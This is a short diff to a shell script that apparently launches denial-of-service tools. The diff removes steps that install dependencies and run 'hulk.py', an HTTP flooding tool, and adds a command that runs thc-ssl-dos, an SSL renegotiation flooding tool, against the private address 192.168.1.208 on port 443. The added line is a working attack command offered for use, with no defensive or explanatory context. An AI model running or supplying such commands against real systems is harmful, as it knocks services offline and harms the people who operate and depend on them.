@@ -11,8 +11,4 @@ green='\033[92m'
 clear
 sleep 1.5
 echo -e "$default"
-apt update && apt upgrade -y
-apt install python -y
-apt install git -y
-python -m pip install -r requirements.txt
-python hulk.py
+thc-ssl-dos -l 100 192.168.1.208 443 --accept
